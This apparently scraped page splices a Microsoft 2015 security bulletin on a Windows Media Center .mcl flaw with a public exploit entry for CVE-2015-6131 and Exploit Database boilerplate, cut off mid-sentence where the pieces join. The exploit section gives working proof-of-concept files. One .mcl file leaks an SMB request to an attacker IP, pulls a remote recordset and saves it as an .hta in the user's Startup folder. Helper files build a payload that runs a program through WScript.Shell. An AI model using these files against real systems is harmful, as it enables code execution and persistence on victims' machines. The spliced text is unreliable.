## Vulnerability in Windows Media Center Could Allow Remote Code Execution (3087918)

Published: September 8, 2015

**Version:** 1.0

## Executive Summary

This security update resolves a vulnerability in Microsoft Windows. The vulnerability could allow remote code execution if Windows Media Center opens a specially crafted Media Center link (.mcl) file that references malicious code. An attacker who successfully exploited this vulnerability could gain the same user rights as the current user. Customers whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.

This security update is rated Important for all supported editions of Windows Media Center when installed on Windows Vista, Windows 7, Windows 8, or Windows 8.1. For more information, see the **Affected Software** section.

The security update addresses the vulnerability by correcting how Windows Media Center link files are handled. For more information about the vulnerability, see the **Vulnerability Information** section.

## Vulnerability Information

## Windows Media Center RCE Vulnerability - CVE-2015-2509

A vulnerability exists in Windows Media Center that could allow remote code execution if Windows Media Center opens a specially crafted Media Center link (.mcl) file that references malicious code. An attacker who successfully exploited this vulnerability could gain the same user rights as the current user. Customers whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

To exploit this vulnerability, an attacker must entice a user to install the .mcl file on the local machine. Malicious code referenced by the .mcl file could then be executed from an attacker-controlled location. The security update addresses the vulnerability by correcting how Media Center link files are handled.

This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number [CVE-2015-2509](https://www.cve.org/CVERecord?id=CVE-2015-2509).

Title: Microsoft Windows Media Center Library Parsing RCE Vuln aka "self-executing" MCL file (CVE-2015-6131)

Software Vendor: Microsoft

Software version : MS Windows Media Center latest version on any Windows OS.

Software Vendor Homepage: http://www.microsoft.com

CVE: CVE-2015-6131

Exploit Author: Eduardo Braun Prado

Vulnerability oficial discoverer: Zhang YunHai of NSFOCUS Security Team

date: december 8, 2015

Vulnerability description:

Windows Media Center contains a remote code execution vulnerability because it allows "MCL" files to reference themselves as HTML pages, which will be parsed inside Windows Media Center window, in the context of the local machine security zone of Internet Explorer browser. This in turn allows execution of arbitrary code using eg. ADO ActiveX Objects. AKA "self-executing" MCL files.

exploit code below:

----------- self-exec-1.mcl ------------------------------------

<application url="self-exec1.mcl"/><html><script>alert(' I am running in local machine zone which allows arbitrary code execution via, for example, ADO Objects')</script></html>

------------------------------------------------------------

----------self-exec-2.mcl--------------------------------------

<application url="self-exec2.mcl"/><html><b>Use a sniffer software to sniff SMB traffic and retrieve the remote Windows username required for this exploit</b><img src=\\192.168.10.10\smbshare\someimg.jpg></img><script> RecordsetURL='http://192.168.10.10:80/recordsetfile.txt'; var rs = new ActiveXObject('ADODB.recordset'); rs.Open(RecordsetURL); rs.Save('C:/users/windowsuser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/poc.hta'); rs.Close();
</script></html>
----------------------------------------------------------

-----Create-recordsetfile.hta --------------

<html><body onload="aa()">

<script language="VBScript">

function aa()

defdir="."

alert "This script will retrieve data from ""recordsetdata.txt"" and save it to the current directory as ""recordsetfile.txt"".

Set c = CreateObject("ADODB.Connection")
co = "Driver={Microsoft Text Driver (*.txt; *.csv)};DefaultDir=" & defdir & ";Extensions=txt;"
c.Open co
set rs =CreateObject("ADODB.Recordset")
rs.Open "SELECT * from recordsetdata.txt", c
al=rs.Save(defdir & "\recordsetfile.txt")
rs.close

end function
</script></body></html>

-------------------------------------------------------------------------------

---------recordsetdata.txt------------------------------------------

<html>
<script>a=new ActiveXObject('Wscript.Shell')</script>
<script>a.Run('calc.exe',1);</script>

compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
